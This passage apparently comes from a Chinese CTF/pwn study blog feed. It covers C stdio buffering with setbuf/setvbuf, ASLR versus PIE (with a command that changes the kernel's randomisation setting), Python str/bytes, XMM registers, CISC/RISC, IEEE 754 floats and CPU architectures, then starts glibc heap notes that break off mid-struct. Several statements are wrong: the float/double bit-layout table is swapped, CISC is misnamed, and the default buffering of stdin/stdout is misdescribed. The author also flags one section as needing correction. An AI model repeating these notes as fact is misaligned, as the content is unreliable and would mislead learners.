scanf() 或 fgets()）从 stdin 中读取数据。</p><p><strong>输出流</strong>通常与输出设备相对应，例如显示器、打印机、文件等。程序可以使用各种输出函数（如 printf() 或 fputs()）将数据输出到输出流中，以便展示给用户或保存到文件中。在 C 语言中，标准输出流 stdout 就是一种输出流，程序可以使用各种输出函数向 stdout 中输出数据。</p><p>除了标准输入流 stdin 和标准输出流 stdout，C 语言还提供了一个<strong>标准错误流 stderr</strong>。与标准输入流和标准输出流类似，标准错误流也是一种数据流，用于向程序开发者或用户报告错误和异常情况。在 C 语言中，标准错误流 stderr 与标准输出流 stdout 类似，也是一种输出流，可以使用各种输出函数将错误信息输出到 stderr 中。与标准输出流不同的是，标准错误流通常不会被缓冲，这意味着当错误信息输出到 stderr 时，它会立即显示在屏幕上或被写入到文件中，以便及时发现和处理错误。</p><h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h3><p>setbuf 是一个标准C库函数，用于设置标准I/O库的缓冲区。它的原型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void setbuf(FILE *restrict stream, char *restrict buf);</span><br></pre></td></tr></table></figure><p>其中，stream 是一个指向 FILE 结构体的指针，用于标识要设置缓冲区的流；buf 是一个指向 char 类型的数组，用于指定缓冲区的地址。<strong>如果 buf 是 NULL，那么会禁用缓冲，相当于将流设置为无缓冲模式</strong>。</p><p>setbuf 函数的作用是设置流的缓冲区，以及决定流的缓冲模式（有缓冲或无缓冲）。</p><p>使用 setbuf 函数可以在打开文件之后立即设置流的缓冲区，这比使用 setvbuf 函数要简单，但是 setbuf 函数不支持自定义缓冲区大小和缓冲模式的设置。</p><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><p>setvbuf和setbuf类似,但有些许差异</p><p>setvbuf 函数原型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int setvbuf(FILE *stream, char *buffer, int mode, size_t size);</span><br></pre></td></tr></table></figure><ol><li><code>stream</code>：一个指向文件流的指针，它指定要设置缓冲区的文件。</li><li><code>buffer</code>：一个指向缓冲区的指针，用于指定自定义缓冲区。如果设置为 <code>NULL</code>，<strong>则 <code>setvbuf</code> 将为文件流分配一个默认缓冲区。</strong></li><li><code>mode</code>：一个整数，指定缓冲区的类型。可以采用以下三个预定义常量之一：<ul><li><code>_IOFBF</code>：完全缓冲（full buffering）模式，文件的读写操作都在缓冲区中进行。数据在缓冲区填满或者使用 <code>fflush</code> 函数刷新缓冲区时才进行实际的读写操作。<strong>值等于0</strong></li><li><code>_IOLBF</code>：行缓冲（line buffering）模式，每次写入缓冲区的数据是以换行符 <code>\n</code> 结尾的，或者缓冲区已满时会自动刷新缓冲区。在读取时，数据也是以行为单位从缓冲区读取。<strong>值等于1</strong></li><li><code>_IONBF</code>：无缓冲（unbuffered）模式，数据立即写入文件或从文件读取，没有缓冲区。<strong>值等于2</strong></li></ul></li><li><code>size</code>：一个 <code>size_t</code> 类型的值，指定缓冲区的大小（仅在自定义缓冲区时有效）。如果 <code>buffer</code> 参数为 <code>NULL</code>，则此参数指定默认缓冲区的大小</li></ol><h3 id="缓冲区刷新"><a href="#缓冲区刷新" class="headerlink" title="缓冲区刷新"></a>缓冲区刷新</h3><p>当缓冲区满时(或行缓冲遇到\n)，<strong>会触发缓冲区刷新操作</strong>，<strong>即将缓冲区内的数据发送到相应的文件或设备中(写入或输出)</strong>。具体来说，缓冲区满的情况下有两种触发缓冲区刷新的方式：</p><ol><li>缓冲区填满(或行缓冲遇到\n)：当缓冲区已满并且程序试图向其写入更多数据时，会自动触发缓冲区刷新操作，将缓冲区内的数据发送到相应的文件或设备中，以便为新的数据腾出空间。(如果换行符后面还有字符则可能会出现一些奇怪的行为)</li><li>强制刷新：程序可以通过调用 fflush 函数强制刷新缓冲区，即将缓冲区内的数据立即发送到相应的文件或设备中，而不必等待缓冲区填满。</li></ol><p>需要注意的是，<strong><u>在默认情况下</u></strong>，缓冲区在以下情况下会自动刷新：</p><ol><li><strong>当程序正常退出时。</strong></li><li><u><strong>当程序调用 exit 函数时。</strong></u></li><li><strong>在输出流（例如标准输出流<code>stdout</code>或标准错误流<code>stderr</code>）中，当缓冲区被填满，或者调用<code>printf()</code>、<code>puts()</code>等输出函数时，会自动刷新缓冲区。</strong></li><li><strong>程序调用了某些输入函数（例如fgets、fscanf、gets、getchar、scanf）来读取缓冲区中的数据，此时缓冲区中的数据将被强制刷新到程序中进行处理。</strong>(如果输入缓冲区中有数据，就会从输入缓冲区中读取数据并进行处理，如果输入缓冲区中没有数据，则会等待用户输入，直到用户输入完毕。当这些函数被调用时，<strong><u>如果输入缓冲区中的数据长度超过了函数所期望的长度，多余的数据将会被保留在输入缓冲区中</u></strong>，等待下一次输入函数调用时被处理。)</li></ol><h3 id="常见形式与功能"><a href="#常见形式与功能" class="headerlink" title="常见形式与功能"></a>常见形式与功能</h3><p>经常能在做题时看见</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li><code>setvbuf(stdout, 0, 2, 0);</code> 表示将标准输出流 stdout 设置为无缓冲模式，并且缓冲区大小为默认大小。</li><li><code>setvbuf(stdin, 0, 1, 0);</code> 表示将标准输入流 stdin 设置为行缓冲模式，并且缓冲区大小为默认大小。</li><li><code>setvbuf(stderr, 0, 1, 0);</code> 表示将标准错误流 stderr 设置为行缓冲模式，并且缓冲区大小为默认大小。</li></ul><p>或者</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>)</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>setbuf函数被用来禁用了标准输入、标准输出和标准错误流的缓冲区，将其设置为无缓冲模式。</p><p>在无缓冲模式下，每次从流中读取或写入的数据都会直接传输到底层设备，而不会先缓存在流的缓冲区中。文件与设备是直接交互的，中间没有缓冲区(存在但未使用)。</p><h3 id="若无setbuf与setvbuf"><a href="#若无setbuf与setvbuf" class="headerlink" title="若无setbuf与setvbuf"></a>若无setbuf与setvbuf</h3><p>在标准C中，<strong><u><em>默认情况下</em></u></strong>，<strong>标准错误流是不缓冲的</strong>，也就是说，每次读取或写入<u>一个字符</u>时都会立即与底层设备进行交互。而<strong>标准输入和标准输出流默认是<u>全缓冲</u>的</strong>，也就是说，每当输出一个<u>换行符</u>或者缓冲区被<u>填满</u>时，才会将缓冲区中的数据输出到屏幕上。</p><p>这也就是为什么一些题目,按照源码明明该有输出,但管道却阻塞无输出的原因</p><p><strong><u>此外若程序在无setbuf与setvbuf的情况下,要想获得其最终结果输出就需要使得程序正常退出(exit())</u></strong></p><p>因为此时输出结果<u>是先缓存在服务器本地的</u>。</p><p>另外，程序<u>本身没有setbuf操作的话</u>，<strong>在第一次执行io操作时会在堆中申请缓冲区(1024?)</strong>。</p><p>上面所述有一些问题，具体与编译器版本有一定关系</p><h3 id="待修！！"><a href="#待修！！" class="headerlink" title="待修！！"></a>待修！！</h3><p>有点懵<br><strong>总之做题过程中，要<u>特别注意传递的数据的长度与程序处理的数据长度对应，特别是换行符的问题</u>！！！</strong></p><p><u>还有相连的输入函数处理问题</u></p><p><strong>还有低级io函数如read、write，与其他标准输入输出函数又有些许不同(<u>例如read似乎并不完全遵守有缓冲模式的规则</u>),需要注意具体分析。</strong></p><h2 id="linux程序执行流程"><a href="#linux程序执行流程" class="headerlink" title="linux程序执行流程"></a>linux程序执行流程</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/hZ3KjroJWDPQBcl.png" alt=""></p><h2 id="ASLR与PIE"><a href="#ASLR与PIE" class="headerlink" title="ASLR与PIE"></a>ASLR与PIE</h2><p>总是混淆分不清,整理一下</p><div class="table-container"><table><thead><tr><th></th><th>作用位置</th><th>归属</th><th>作用时间</th></tr></thead><tbody><tr><td>ASLR</td><td>0:不开启<br/>1：栈基地址（stack）、共享库（.so\libraries）、mmap 基地址<br/>2：在 1 基础上，增加随机化堆基地址（chunk）</td><td>系统功能</td><td>作用于程序（ELF）装入内存运行时</td></tr><tr><td>PIE</td><td>代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td><td>编译器功能</td><td>作用于程序（ELF）编译过程中</td></tr></tbody></table></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改ASLR设置</span><br><span class="line">echo 0/1/2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h2 id="python3-str-amp-amp-bytes"><a href="#python3-str-amp-amp-bytes" class="headerlink" title="python3-str&amp;&amp;bytes"></a>python3-str&amp;&amp;bytes</h2><p>在Python 3中,有两种类型的文本数据字符串(str)和字节串(bytes).</p><h3 id="异同"><a href="#异同" class="headerlink" title="异同"></a>异同</h3><p>二者最大的差异在于编码方式:</p><ol><li>字符串是Unicode字符序列，使用UTF-8等编码方式存储。</li><li>字节串是二进制数据序列，它们是字节的序列，采用ASCII编码,每个字节的值在0-255之间。</li></ol><p>此外还有许多细节差异</p><ol><li>可变性： 字符串是不可变的，这意味着一旦创建，就不能修改它们的内容。字节串也是不可变的，但它们可以被替换成一个新的字节串。</li><li>用途： 字符串通常用于文本处理，如字符串的搜索、替换、拼接等。字节串通常用于二进制数据处理，如图像、声音、视频等数据的读写和处理。</li><li>操作符的区别： 在字符串中，“+”运算符表示字符串的连接，而在字节串中，“+”运算符表示字节串的拼接。在字符串中，“<em>”运算符表示重复一个字符串，而在字节串中，“\</em>”运算符表示重复一个字节串。</li><li>方法的区别： 字符串和字节串具有许多相同的方法，但在实现上有所不同。例如，在字符串中，str.split()方法返回一个字符串列表，而在字节串中，bytes.split()方法返回一个字节串列表。</li></ol><h3 id="表示"><a href="#表示" class="headerlink" title="表示"></a>表示</h3><ol><li>str:字符串使用单引号、双引号或三重引号来表示。</li><li>bytes:字节串则使用<strong>前缀“b”</strong>来表示，后跟一对单引号、双引号或三重引号。</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string1 = <span class="string">&#x27;Hello, world!&#x27;</span></span><br><span class="line">bytes1 = <span class="string">b&#x27;Hello, world!&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="变量插入"><a href="#变量插入" class="headerlink" title="变量插入"></a>变量插入</h3><p>{}留空,逐个对应format中的变量</p><p>在str中插入变量</p><p><code>str=&#39;abc&#123;&#125;&#39;.format()&#39;</code></p><p>在bytes中插入变量</p><p><code>bytes=bytes(&#39;abc&#123;&#125;&#39;.format(),&#39;utf-8&#39;)</code></p><p>bytes插入变量需要<strong>指定解码方式</strong></p><h2 id="XMM寄存器"><a href="#XMM寄存器" class="headerlink" title="XMM寄存器"></a>XMM寄存器</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>现代处理器还有一些扩展,这些扩展体现在电路上，指令集上，有时候也会扩展一些很有用的寄存器。</p><p>比较著名的扩展叫作 SSE (Streaming SIMD Extensions)，该扩展加入了新的 xmm 寄存器集合：</p><p><strong>xmm0，xmm1，…，xmm15</strong>。共16个寄存器,这些寄存器固定为 <strong>128 位宽</strong>，常用于两种任务：</p><ul><li>浮点数运算；</li><li>SIMD 指令集(这种指令一条指令可以操作多条数据)</li></ul><p>每个XMM寄存器都可以存储128位（16字节）的数据，并且可以用于执行一次性并行处理多个数据的操作，如浮点运算、图像处理和向量运算等。这使得XMM寄存器在执行高性能计算和多媒体应用程序时非常有用。</p><h3 id="内存对齐问题"><a href="#内存对齐问题" class="headerlink" title="内存对齐问题"></a>内存对齐问题</h3><p>先看操作xmm寄存器的四个指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movaps和movups之间的区别在于对内存对齐的要求。movaps要求数据在内存中按照128位对齐，而movups可以处理未对齐的数据。</span><br><span class="line"></span><br><span class="line">movups：将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置。与movaps不同，movups不要求数据在内存中按照128位对齐。</span><br><span class="line"></span><br><span class="line">movdqa：将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置。与movaps类似，movdqa要求数据在内存中按照128位对齐。</span><br><span class="line"></span><br><span class="line">movdqu：类似于movups，它将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置，但是对内存对齐没有特殊要求。它可以处理未对齐的数据，并且在某些情况下，可能会导致性能下降。</span><br></pre></td></tr></table></figure><p><strong>结论:movaps和movdqa要求内存对齐,而movups和movdqu不要求</strong></p><p>大多数 SSE 指令都需要内存操作数适当地进行对齐。上面说到的未对齐版本的指令和对齐版本的指令在助记符上就有差别，而且因为内存未对齐的关系，性能也会受影响。由于 SSE 指令经常被用在性能敏感的场合，所以始终使用操作数内存对齐版本的指令是明智之举。</p><h2 id="CISC和RISC"><a href="#CISC和RISC" class="headerlink" title="CISC和RISC"></a>CISC和RISC</h2><p>处理器有一种按照其指令集进行分类的方式。当设计一个处理器时有两个极端。</p><ul><li>设计出各种特化指令，高级指令。这种架构叫作 <strong>CISC (Complete Instruction Set Computer)</strong> 架构。</li><li>只使用一些基本指令，完成的架构叫 <strong>RISC (Reduced Instruction Set Computer)</strong> 架构。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">指令集复杂：CISC架构的指令集包含大量的复杂指令，可以执行更高级的操作，如内存访问、字符串处理、浮点运算等。这些指令通常具有多个操作数和复杂的寻址模式。</span><br><span class="line">指令多样性：CISC架构的指令集包含各种不同的指令，每个指令可以执行多个操作，甚至一个指令可以完成一系列操作。这使得编程更灵活，但也增加了硬件的复杂性。</span><br><span class="line">存储器访问：CISC架构通常允许直接访问内存，即指令可以直接操作内存中的数据，而不需要将数据加载到寄存器中。</span><br><span class="line">指令长度不统一：CISC指令长度可以不同，从几个字节到几十个字节不等，这使得指令解码复杂。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">简化指令集：RISC架构的指令集相对简化，指令数量较少且固定，每个指令执行的操作也更加简单和基本，如算术运算、逻辑运算等。</span><br><span class="line">指令统一性：RISC架构的指令长度一般是固定的，通常为两个字（32位）或一个字（16位），这简化了指令解码和处理器设计。</span><br><span class="line">寄存器优先：RISC架构鼓励使用寄存器操作，大多数操作都在寄存器上进行，减少了对内存的直接访问。</span><br><span class="line">流水线执行：RISC架构更注重流水线执行，指令之间的依赖关系较少，可以并行执行，提高了处理器的性能。</span><br></pre></td></tr></table></figure><h2 id="浮点数在内存中的存储"><a href="#浮点数在内存中的存储" class="headerlink" title="浮点数在内存中的存储"></a>浮点数在内存中的存储</h2><p>在计算机中，浮点数表示方式采用了<strong>IEEE 754</strong>标准。IEEE 754定义了浮点数的二进制表示规范，它规定了浮点数的位数、指数位数、小数位数等。</p><div class="table-container"><table><thead><tr><th></th><th>符号位</th><th>指数位</th><th>小数位</th></tr></thead><tbody><tr><td>float</td><td>1位</td><td>11位(偏移1023)</td><td>52位</td></tr><tr><td>double</td><td>1位</td><td>8位(偏移127)</td><td>23位</td></tr></tbody></table></div><p>具体的存储方式为：</p><ol><li>符号位：用于表示浮点数的正负号，0表示正数，1表示负数。</li><li>指数位：用于表示浮点数的指数部分。采用”偏移量表示法”，即指数的实际值等于存储的值减去一个偏移量，这样可以使指数既有正数又有负数的表示范围。</li><li>小数位：用于表示浮点数的小数部分。</li></ol><p><strong>具体的转换过程如下：</strong></p><ol><li>将浮点数转换为二进制科学计数法：将浮点数表示为M乘以2的E次方的形式。<strong>其中M是一个大于等于1且小于2的小数（隐藏了最高位的1）</strong>，E是整数。</li><li>根据科学计数法，将M和E转换为二进制表示。</li><li>将符号位、指数位、和小数位组合在一起形成64位二进制数，即双精度浮点数的内存表示。</li></ol><p>举个例子，我们将<code>3.14</code>转换成双精度浮点数(double)的二进制表示：</p><ol><li><code>3.14</code>的二进制科学计数法为<code>1.570*2^1</code>，其中<code>1.570</code>是小数部分，<code>2^1</code>是2的1次方，即2。</li><li><code>1.570</code>的二进制表示是<code>1.1010001001100110011001100110011001100110011001101</code>。</li><li><code>2</code>的二进制表示是<code>10</code>。</li></ol><p>现在将符号位、指数位、和小数位组合在一起：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">符号位: 0 (表示正数)</span><br><span class="line">指数位: 1023 + 1 = 1024，对应的二进制表示是：`10000000000`</span><br><span class="line">小数位: `1010001001100110011001100110011001100110011001101`</span><br></pre></td></tr></table></figure><p>将它们放在一起：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 10000000000 1010001001100110011001100110011001100110011001101</span><br></pre></td></tr></table></figure><p><strong>NaN:</strong></p><p>在IEEE 754浮点数标准中，NaN（Not a Number）是一种特殊的浮点数表示，用于表示非法的或未定义的操作的结果。NaN不是一个具体的数字，而是一种特殊的标记。</p><p><code>01111111111  1111 1111 1111 1111 1111 1111 1111 1111</code></p><p>满足</p><div class="table-container"><table><thead><tr><th>Comparison</th><th>NaN ≥ <em>x</em></th><th>NaN ≤ <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN = <em>x</em></th><th>NaN ≠ <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table></div><p>且NaN!=NaN是成立的</p><p><strong>小数转二进制</strong></p><p>例如，我们要将十进制数0.625转换为二进制表示：</p><ol><li>0.625的整数部分为0，保留小数部分。</li><li>将0.625乘以2，得到1.25。整数部分为1，保留小数部分0.25。</li><li>再将0.25乘以2，得到0.5。整数部分为0，保留小数部分0.5。</li><li>继续将0.5乘以2，得到1.0。整数部分为1，没有小数部分，结束。</li></ol><p>将每次得到的整数部分依次排列起来，就得到了0.625的二进制表示：0.101。</p><p>对于无限不循环小数（如π、e等），在计算机中是无法完全表示的，因为计算机的内存是有限的。因此，对于这些无限不循环小数，计算机只能使用有限的位数来表示，导致了一定的精度损失。</p><h2 id="四大常见架构"><a href="#四大常见架构" class="headerlink" title="四大常见架构"></a>四大常见架构</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-09-05_153014.png" alt=""></p><ol><li><strong>x86 架构</strong>：<ul><li>最常见的处理器架构之一，由英特尔（Intel）和 AMD 公司开发和推广。</li><li>主要用于个人电脑和服务器领域。</li><li>典型的操作系统如Windows和Linux都支持x86架构。</li><li>x86处理器通常采用复杂指令集计算机（CISC）设计，具有广泛的软件兼容性。</li></ul></li><li><strong>ARM 架构</strong>：<ul><li>常见于移动设备、嵌入式系统和物联网设备中。</li><li>低功耗、高性能和节能的特性使其成为移动计算领域的主流。</li><li>ARM处理器通常采用精简指令集计算机（RISC）设计，具有出色的能效和性能平衡。</li></ul></li><li><p><strong>MIPS 架构</strong>：</p><ul><li>最初用于工作站和嵌入式系统。</li><li>具有良好的性能和可扩展性，适用于一些特定应用。</li><li>在某些嵌入式领域仍然有一定的存在。</li></ul></li><li><p><strong>RISC-V</strong></p><ul><li><p>RISC-V是一种开放标准的指令集架构（ISA），任何人都可以免费使用、实现和定制它，而不必支付专利费用。这使得RISC-V在开源和学术界广泛流行。</p></li><li><p>与传统的CISC架构（如x86）不同，RISC-V采用了精简指令集计算机（RISC）设计原则，使指令集更简单和统一，有助于提高性能和降低功耗。</p></li><li><p>RISC-V的设计非常模块化，可以根据需求自定义指令集，这使得它非常适合各种应用，从嵌入式系统到高性能计算。</p></li><li><p>RISC-V可用于各种应用领域，包括嵌入式系统、物联网设备、移动设备、服务器、超级计算机等。</p></li></ul></li><li><p><strong>Power 架构</strong>：</p><ul><li>最初由IBM开发，用于高性能计算和服务器领域。</li><li>具有强大的多核和多线程性能，广泛应用于超级计算机和高性能计算集群。</li></ul></li></ol><h2 id="数据编码"><a href="#数据编码" class="headerlink" title="数据编码"></a>数据编码</h2>]]></content>
      
      
      <categories>
          
          <category> 杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆学习笔记</title>
      <link href="/posts/8932/"/>
      <url>/posts/8932/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>堆的学习可以说是一道坎了，要掌握的话对源码阅读及理解的能力要求挺高，初学时往往被搞得晕头转向，这里就记录一下我的学习记录，基础的东西到处都有就不记了，主要还是记一些我认为比较重要或者容易被忽略的细节。</p><hr><h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>基础的东西网上能搜到的教程(像ctfwiki,狼组安全,ctf-all-in-one等)讲的已经很细了，认真看一定能有一个基础的知识框架.不过还是推荐看一看华庭大佬的<a href="https://pan.baidu.com/s/167Z3CHDEeP1dl3c2Ii0lXg?pwd=1234">glibc内存管理-ptmalloc2源码分析</a>(很细很全很直白),看了之后真的能有很多收获.</p><h2 id="理清从属关系"><a href="#理清从属关系" class="headerlink" title="理清从属关系"></a>理清从属关系</h2><p>初学时,heap,arena,chunk这些东西很容易把人搞糊涂,这里简单梳理一下</p><p>系统中整个堆功能的实现区域都可以被叫做堆(heap),但其实但heap还有一个相对这个整个堆区域要更小的概念,如下:</p><p>glibc的malloc源码中涉及三种最重要数据结构：<strong>Arena、Heap、Chunk</strong> ，分别对应结构体<strong>malloc_state、heap_info、malloc_chunk 。</strong>每个数据结构都有对应的结构体实现,如图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_095156.png" alt=""></p><ul><li><strong>Thread - Arena</strong> ： 一个Arena对应多个线程Thread。即每个线程都有一个Arena，但是有可能多个线程共用一个Arena(同一时间只能一对一)。每个Arena都包含一个malloc_state结构体，保存bins, top chunk, Last reminder chunk等信息。</li><li><strong>Arena - Heap</strong>：一个Arena可能拥有多个heap。Arena开始的时候只有一个heap，但是当这个heap的空间用尽时，就需要获取新的heap。(也可以理解为subheap子堆)</li><li><strong>Heap - Chunk</strong>：一个Heap根据用户的请求会划分为多个chunk，每个chunk拥有自己的header - malloc_chunk。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_161600.png" alt=""></p><p>需要注意的是，<em>Main Arena只有一个heap，因此没有heap_info结构</em>。当main arena用尽空间后，会扩展当前的heap空间。此外，Main Arean的Arena header并不是heap segment的一部分，而作为全局变量储存在libc.so的数据段中。</p><p>下图是只有一个heap时，主线程和线程的堆结构示意图，左图是Main Arena，右图是Threa Arena。堆是从低地址向高地址增长的，可以看到每一个malloc_chunk上面都跟着一个chunk。同时Main Arena没有heap_info和malloc_state的结构。 </p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_095630.png" alt=""></p><p>下图是存在多个heap的thread Arena的情况。可以看到每一个heap都一个heap header（heap_info），但是只有最初的heap拥有arena header(malloc_state).</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_095644.png" alt="graph"></p><p>当线程申请内存时，就创建一个Arena。主线程有自己独立的Arena，叫做main arena，但不是每一个线程都有独立的Arena。</p><p>Arena的个数取决于cpu核的个数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-17_204838.png" alt=""></p><h2 id="三个重要结构体的定义"><a href="#三个重要结构体的定义" class="headerlink" title="三个重要结构体的定义"></a>三个重要结构体的定义</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span 